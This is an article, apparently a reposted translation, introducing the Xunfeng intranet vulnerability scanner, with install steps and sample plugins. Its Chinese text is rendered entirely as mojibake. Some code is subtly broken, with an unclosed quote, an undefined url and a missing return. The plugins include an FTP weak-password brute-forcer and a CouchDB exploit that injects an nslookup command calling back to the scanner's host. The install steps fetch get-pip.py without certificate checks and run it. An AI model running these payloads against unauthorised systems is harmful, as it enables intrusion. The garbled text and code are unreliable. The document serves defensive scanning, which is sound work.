# YSRCè¯šæ„ä¹‹ä½œï¼Œå·¡é£-ä¼ä¸šå®‰å…¨æ¼æ´å¿«é€Ÿåº”æ€¥ã€å·¡èˆªç³»ç»Ÿ
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« æ¥æºï¼šåŒç¨‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ
åŸæ–‡åœ°å€ï¼š
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
**Githubåœ°å€ï¼š**
åšæŒå¼€æºå®‰å…¨é¡¹ç›®ä¸å®¹æ˜“ï¼Œgit clone çš„æ—¶å€™æ±‚é¡ºæ‰‹è½¬å‘ã€‚
**é¡¹ç›®ç®€ä»‹**
**å·¡é£** æ˜¯ä¸€æ¬¾é€‚ç”¨äºä¼ä¸šå†…ç½‘çš„ **æ¼æ´å¿«é€Ÿåº”æ€¥** ã€ **å·¡èˆªæ‰«æç³»ç»Ÿ**
ï¼Œé€šè¿‡æœç´¢åŠŸèƒ½å¯æ¸…æ™°çš„äº†è§£å†…éƒ¨ç½‘ç»œèµ„äº§åˆ†å¸ƒæƒ…å†µï¼Œå¹¶ä¸”å¯æŒ‡å®šæ¼æ´æ’ä»¶å¯¹æœç´¢ç»“æœè¿›è¡Œå¿«é€Ÿæ¼æ´æ£€æµ‹å¹¶è¾“å‡ºç»“æœæŠ¥è¡¨ã€‚
å…¶ä¸»ä½“åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š **ç½‘ç»œèµ„äº§è¯†åˆ«å¼•æ“** ï¼Œ **æ¼æ´æ£€æµ‹å¼•æ“** ã€‚
ç½‘ç»œèµ„äº§è¯†åˆ«å¼•æ“ä¼šé€šè¿‡ç”¨æˆ·é…ç½®çš„IPèŒƒå›´ **å®šæœŸè‡ªåŠ¨**
çš„è¿›è¡Œç«¯å£æ¢æµ‹ï¼ˆæ”¯æŒè°ƒç”¨MASSCANï¼‰ï¼Œå¹¶è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«å†…å®¹åŒ…æ‹¬ï¼šæœåŠ¡ç±»å‹ã€ç»„ä»¶å®¹å™¨ã€è„šæœ¬è¯­è¨€ã€CMSã€‚
æ¼æ´æ£€æµ‹å¼•æ“ä¼šæ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ **ä»»åŠ¡è§„åˆ™** è¿›è¡Œå®šæœŸæˆ–è€…ä¸€æ¬¡æ€§çš„æ¼æ´æ£€æµ‹ï¼Œå…¶æ”¯æŒ2ç§æ’ä»¶ç±»å‹ã€æ ‡ç¤ºç¬¦ä¸è„šæœ¬ï¼Œå‡å¯é€šè¿‡webæ§åˆ¶å°è¿›è¡Œæ·»åŠ ã€‚
**å®‰è£…æŒ‡å—**
**åŸºç¡€ç¯å¢ƒéœ€æ±‚ï¼š**
Python 2.7 mongodb 3.0
è¿è¡Œä¸å®‰è£…è¿‡ç¨‹éœ€è¦åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œ
    # å®˜ç½‘å›½å†…ä¸‹è½½è¾ƒæ…¢ï¼Œæˆ‘ä»¬æä¾›äº†é•œåƒåœ°å€ï¼Œæ ¹æ®è‡ªå·±çš„ç³»ç»Ÿä¸‹è½½å¯¹åº”çš„
    https://sec.ly.com/mirror/python-2.7.13.msi
    https://sec.ly.com/mirror/python-2.7.13.amd64.msi
    https://sec.ly.com/mirror/mongodb-linux-x86_64-3.4.0.tgz
    https://sec.ly.com/mirror/mongodb-linux-x86_64-ubuntu1604-3.4.0.tgz
    https://sec.ly.com/mirror/mongodb-linux-x86_64-ubuntu1404-3.4.0.tgz
    https://sec.ly.com/mirror/mongodb-win32-x86_64-2008plus-ssl-3.4.0-signed.msi
    https://sec.ly.com/mirror/mongodb-osx-ssl-x86_64-3.4.1.tgz
**å®‰è£…ç›¸å…³ä¾èµ–ï¼š**
    # CentOS
    yum install gcc libffi-devel python-devel openssl-devel libpcap-devel
    # Ubuntu/Debian
    sudo apt-get update && sudo apt-get install gcc libssl-dev libffi-dev python-dev libpcap-dev
**å®‰è£…pythonä¾èµ–åº“ï¼š**
    # éœ€å…ˆå®‰è£…pipï¼Œå»ºè®®ä½¿ç”¨è±†ç“£çš„pipæºï¼Œå¦åˆ™å¯èƒ½ä¼šå› ä¸ºè¶…æ—¶å¯¼è‡´å‡ºé”™ã€‚    
    wget https://sec.ly.com/mirror/get-pip.py --no-check-certificate
    python get-pip.py
    # å·²ç»æœ‰pipéœ€æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬
    pip install -U pip
    pip install pymongo Flask xlwt paramiko
**Linux éƒ¨ç½²æµç¨‹**
**å¯åŠ¨æœåŠ¡ï¼š**
    nohup ./mongod --port 65521 --dbpath DBData &
    # DBDataä¸ºæ•°æ®åº“æŒ‡å®šå­˜åœ¨ç›®å½•
**å¯¼å…¥æ•°æ®ï¼š**
    ./mongorestore -h 127.0.0.1 --port 65521 -d xunfeng db
    # dbä¸ºåˆå§‹æ•°æ®åº“ç»“æ„æ–‡ä»¶å¤¹è·¯å¾„
    # ä½ç‰ˆæœ¬ä¸æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œéœ€ä½¿ç”¨é«˜äº MongoDB 3.2ç‰ˆæœ¬
**å¢åŠ è®¤è¯ï¼š**
    ./mongo --port 65521
    use xunfeng
    db.createUser({user:'scan',pwd:'your password',roles:[{role:'dbOwner',db:'xunfeng'}]})
    exit
    # è¯·å°† your password æ¢ä¸ºä½ è®¾å®šçš„å¯†ç ã€‚
**åœæ­¢æœåŠ¡ï¼š**
    kill -9 $(pidof mongod)
**ä¿®æ”¹æ—¶åŒºï¼š**
    echo TZ='Asia/Shanghai'; export TZ >> ~/.bash_profile
    source ~/.bash_profile
**å¯åŠ¨æœåŠ¡ï¼š**
    # æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹Conifg.pyå’ŒRun.shæ–‡ä»¶
    sh Run.sh å¯åŠ¨æœåŠ¡ã€‚
**Windows éƒ¨ç½²æµç¨‹**
**å¯åŠ¨æœåŠ¡ï¼š**
    mongod.exe --port 65521 --dbpath DBData
    # DBDataä¸ºæ•°æ®åº“æŒ‡å®šå­˜åœ¨ç›®å½•ã€‚
**å¯¼å…¥æ•°æ®ï¼š**
    mongorestore.exe -h 127.0.0.1 --port 65521 -d xunfeng db
    # dbä¸ºåˆå§‹æ•°æ®åº“ç»“æ„æ–‡ä»¶å¤¹è·¯å¾„
    # ä½ç‰ˆæœ¬ä¸æ”¯æŒå…¨æ–‡ç´¢å¼•ï¼Œéœ€ä½¿ç”¨é«˜äº MongoDB 3.2ç‰ˆæœ¬
**å¢åŠ è®¤è¯ï¼š**
    ./mongo --port 65521
    use xunfeng
    db.createUser({user:'scan',pwd:'your password',roles:[{role:'dbOwner',db:'xunfeng'}]})
    exit
    # è¯·å°† your password æ¢ä¸ºä½ è®¾å®šçš„å¯†ç ã€‚
**åœæ­¢æœåŠ¡ï¼š**
    Ctrl + c å…³é—­mongodbæœåŠ¡
**å¯åŠ¨æœåŠ¡ï¼š**
    # æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹Conifg.pyå’ŒRun.batæ–‡ä»¶ã€‚
    è¿è¡ŒRun.bat å¯åŠ¨æœåŠ¡ã€‚
**Docker å¸ƒç½²**
**ä½¿ç”¨ Dockerfile å¸ƒç½²**
Dockerfile
æºæ–‡ä»¶è¯·å‰å¾€[è¿™é‡Œ](https://github.com/Medicean/VulApps/tree/master/tools/xunfeng)æŸ¥çœ‹
**ç›´æ¥è·å– Docker hub é•œåƒ (æ¨è)**
æ‹‰å–é•œåƒåˆ°æœ¬åœ°
    $ docker pull medicean/vulapps:tools_xunfeng
å¦‚æœè·å–é€Ÿåº¦æ…¢ï¼Œæ¨èä½¿ç”¨[ä¸­ç§‘å¤§ Docker
Mirrors](https://lug.ustc.edu.cn/wiki/mirrors/help/docker)åŠ é€Ÿ
å¯åŠ¨ç¯å¢ƒ
    $ docker run -d -p 8000:80 medicean/vulapps:tools_xunfeng
-p 8000:80 å‰é¢çš„ 8000 ä»£è¡¨ç‰©ç†æœºçš„ç«¯å£ï¼Œå¯éšæ„æŒ‡å®šã€‚
è®¿é—®: http://127.0.0.1:8000/ æ­£å¸¸è®¿é—®åˆ™ä»£è¡¨å®‰è£…æˆåŠŸ
**Docker é•œåƒä¿¡æ¯**
****
# è®°å¾—ä¿®æ”¹é»˜è®¤å¯†ç ï¼Œæ„Ÿè°¢çƒ­å¿ƒç½‘å‹ Medicean æä¾›çš„Dockeré•œåƒ ğŸ™‚
****
**é…ç½®æŒ‡å—**
åœ¨é…ç½®-çˆ¬è™«å¼•æ“-ç½‘ç»œèµ„äº§æ¢æµ‹åˆ—è¡¨ è®¾ç½®å†…ç½‘IPæ®µ **ï¼ˆå¿…é¡»é…ç½®ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼‰** ã€‚
åœ¨é…ç½®-çˆ¬è™«å¼•æ“-èµ„äº§æ¢æµ‹å‘¨æœŸ è®¾ç½®è®¡åˆ’è§„åˆ™ã€‚
å¯å¯ç”¨MASSCAN(æ¢æµ‹èŒƒå›´ä¸ºå…¨ç«¯å£)ä»£æ›¿é»˜è®¤çš„ç«¯å£æ¢æµ‹è„šæœ¬ï¼Œéœ€å®‰è£…å¥½MASSCANåé…ç½® **ç¨‹åºå®Œæ•´ç»å¯¹è·¯å¾„** ï¼Œç‚¹å‡»å¼€å¯å³å¯å®Œæˆåˆ‡æ¢ã€‚
å…¶ä»–é…ç½®æ ¹æ®è‡ªèº«éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚
**æ’ä»¶ç¼–å†™**
æ¼æ´æ’ä»¶æ”¯æŒ2ç§ç±»å‹ï¼Œæ ‡ç¤ºç¬¦ä¸pythonè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡å®˜æ–¹æ¨é€æ¸ é“å®‰è£…æˆ–è€…è‡ªè¡Œæ·»åŠ ã€‚
**JSONæ ‡ç¤ºç¬¦**
ä¾‹å­
**Pythonè„šæœ¬**
æ’ä»¶æ ‡å‡†éå¸¸ç®€æ´ï¼Œåªéœ€é€šè¿‡ get_plugin_info æ–¹æ³•å®šä¹‰æ’ä»¶ä¿¡æ¯ï¼Œcheckå‡½æ•°æ£€æµ‹æ¼æ´å³å¯ã€‚
    # coding:utf-8
    import ftplib
    def get_plugin_info():  # æ’ä»¶æè¿°ä¿¡æ¯
        plugin_info = {
            "name": "FTPå¼±å£ä»¤", 
            "info": "å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¸¥é‡æƒ…å†µå¯å¯¼è‡´æœåŠ¡å™¨è¢«å…¥ä¾µæ§åˆ¶ã€‚",
            "level": "é«˜å±",
            "type": "å¼±å£ä»¤",
            "author": "wolf@YSRC",
            "url": "",
            "keyword": "server:ftp",  # æ¨èæœç´¢å…³é”®å­—
        }
        return plugin_info
    def check(ip, port, timeout): # æ¼æ´æ£€æµ‹ä»£ç 
        user_list = ['ftp', 'www', 'admin', 'root', 'db', 'wwwroot', 'data', 'web']
        for user in user_list:
            for pass_ in PASSWORD_DIC:  # å¯†ç å­—å…¸æ— éœ€å®šä¹‰ï¼Œç¨‹åºä¼šè‡ªåŠ¨ä¸ºå…¶èµ‹å€¼ã€‚
                pass_ = str(pass_.replace('{user}', user))
                try:
                    ftp = ftplib.FTP()
                    ftp.timeout = timeout
                    ftp.connect(ip, port)
                    ftp.login(user, pass_)
                    if pass_ == '': pass_ = "null"
                    if user == 'ftp' and pass_ == 'ftp: return u"å¯åŒ¿åç™»å½•"
                    return u"å­˜åœ¨å¼±å£ä»¤ï¼Œè´¦å·ï¼š%sï¼Œå¯†ç ï¼š%s" % (user, pass_)  # æˆåŠŸè¿”å›ç»“æœï¼Œå†…å®¹æ˜¾ç¤ºåœ¨æ‰«æç»“æœé¡µé¢ã€‚
                except:
                    pass
æ­¤å¤–ç³»ç»Ÿå†…åµŒäº†è¾…åŠ©éªŒè¯åŠŸèƒ½:
    DNSï¼šè§¦å‘ï¼Œnslookup randomstr IPï¼ŒéªŒè¯ï¼Œ http://ip/randomstr ï¼Œè¿”å›YESå³å­˜åœ¨ã€‚
    HTTPï¼šè§¦å‘ï¼Œhttp://ip/add/randomstr ï¼ŒéªŒè¯ï¼Œ http://ip/check/randomstr ï¼Œè¿”å›YESå³å­˜åœ¨ã€‚
ä½¿ç”¨ä¾‹å­:
    import urllib2
    import random
    import socket
    def get_plugin_info():  # æ’ä»¶æè¿°ä¿¡æ¯
        plugin_info = {
            "name": "CouchDBæœªæˆæƒè®¿é—®", 
            "info": "å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ§åˆ¶é¢æ¿æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«å…¥ä¾µã€‚",
            "level": "é«˜å±",
            "type": "æœªæˆæƒè®¿é—®",
            "author": "wolf@YSRC",
            "url": "",
            "keyword": "server:couchdb",  # æ¨èæœç´¢å…³é”®å­—
        }
    def get_ver_ip():
        csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        csock.connect(('8.8.8.8', 80))
        (addr, port) = csock.getsockname()
        csock.close()
        return addr
    def random_str(len):
        str1=""
        for i in range(len):
            str1+=(random.choice("ABCDEFGH1234567890"))
        return str(str1)
    def check(ip,port,timeout):
        rand_str = random_str(8)
        cmd = random_str(4)
        server_ip = get_ver_ip()
        req_list = [
            ["/_config/query_servers/%s"%(cmd),'"nslookup %s %s>log"'%(rand_str,server_ip)],
            ["/vultest123",''],
            ["/vultest123/test",'{"_id":"safetest"}']
        ]
        for req_info in req_list:
            try:
                request = urllib2.Request(url+req_info[0],req_info[1],timeout=timeout)
                request.get_method = lambda: 'PUT'
                urllib2.urlopen(request)
            except:
                pass
        try:
            req_exec = urllib2.Request(url + "/vultest123/_temp_view?limit=11",'{"language":"%s","map":""}'%(cmd))
            req_exec.add_header("Content-Type","application/json")
            urllib2.urlopen(req_exec)
        except:
            pass
        check = urllib2.urlopen("http://%s/%s"%(server_ip,rand_str)).read()
        if 'YES' in check:
            return u"æœªæˆæƒè®¿é—®"
**  
**
**æµç¨‹æ¼”ç¤ºè§†é¢‘**
#æ¼”ç¤ºæ•°æ®ä¸ºå¡«å……æ•°æ®
**æ–‡ä»¶ç»“æ„**
    â”‚  Config.py  # é…ç½®æ–‡ä»¶
    â”‚  README.md  # è¯´æ˜æ–‡æ¡£
    â”‚  Run.bat  # Windowså¯åŠ¨æœåŠ¡
    â”‚  Run.py  # webserver
    â”‚  Run.sh    # Linuxå¯åŠ¨æœåŠ¡ï¼Œé‡æ–°å¯åŠ¨å‰éœ€æŠŠè¿›ç¨‹å…ˆç»“æŸæ‰
    â”‚  
    â”œâ”€aider
    â”‚      Aider.py  # è¾…åŠ©éªŒè¯è„šæœ¬
    â”‚      
    â”œâ”€db  # åˆå§‹æ•°æ®åº“ç»“æ„
    â”‚      
    â”œâ”€masscan  # å†…ç½®ç¼–è¯‘å¥½çš„Masscanç¨‹åºï¼ˆCentOS win64é€‚ç”¨ï¼‰ï¼Œéœ€è¦chmod+xç»™æ‰§è¡Œæƒé™ï¼ˆrootï¼‰ï¼Œè‹¥æ— æ³•ä½¿ç”¨è¯·è‡ªè¡Œç¼–è¯‘å®‰è£…ã€‚ 
    â”œâ”€nascan
    â”‚  â”‚  NAScan.py # ç½‘ç»œèµ„äº§ä¿¡æ¯æŠ“å–å¼•æ“
    â”‚  â”‚  
    â”‚  â”œâ”€lib
    â”‚  â”‚      common.py å…¶ä»–æ–¹æ³•
    â”‚  â”‚      icmp.py  # ICMPå‘é€ç±»
    â”‚  â”‚      log.py  # æ—¥å¿—è¾“å‡º
    â”‚  â”‚      mongo.py  # æ•°æ®åº“è¿æ¥
    â”‚  â”‚      scan.py  # æ‰«æä¸è¯†åˆ«
    â”‚  â”‚      start.py  # çº¿ç¨‹æ§åˆ¶
    â”‚  â”‚      
    â”‚  â””â”€plugin
    â”‚          masscan.py  # è°ƒç”¨Masscanè„šæœ¬
    â”‚          
    â”œâ”€views
    â”‚  â”‚  View.py  # webè¯·æ±‚å¤„ç†
    â”‚  â”‚  
    â”‚  â”œâ”€lib
    â”‚  â”‚      Conn.py  # æ•°æ®åº“å…¬å…±ç±»
    â”‚  â”‚      CreateExcel.py  # è¡¨æ ¼å¤„ç†
    â”‚  â”‚      Login.py  # æƒé™éªŒè¯
    â”‚  â”‚      QueryLogic.py  # æŸ¥è¯¢è¯­å¥è§£æ
    â”‚  â”‚      
    â”‚  â”œâ”€static #é™æ€èµ„æºç›®å½•
    â”‚  â”‚              
    â”‚  â””â”€templates #æ¨¡æ¿æ–‡ä»¶ç›®å½•
    â”‚          
    â””â”€vulscan
        â”‚  VulScan.py  # æ¼æ´æ£€æµ‹å¼•æ“
        â”‚  
        â””â”€vuldb # æ¼æ´åº“ç›®å½•
æ‰«æä¸‹æ–¹äºŒç»´ç å…³æ³¨YSRCå…¬ä¼—å·ï¼Œå›å¤è‡ªå·±çš„å¾®ä¿¡å·+å·¡é£ï¼Œä¼šæœ‰äººæ‹‰ä½ è¿›å·¡é£çš„å¾®ä¿¡è®¨è®ºç¾¤ï¼Œéƒ¨ç½²ã€æ’ä»¶ç¼–å†™é‡åˆ°é—®é¢˜æˆ–è€…æœ‰ä»€ä¹ˆæƒ³æ³•éƒ½å¯ä»¥è®¨è®ºã€‚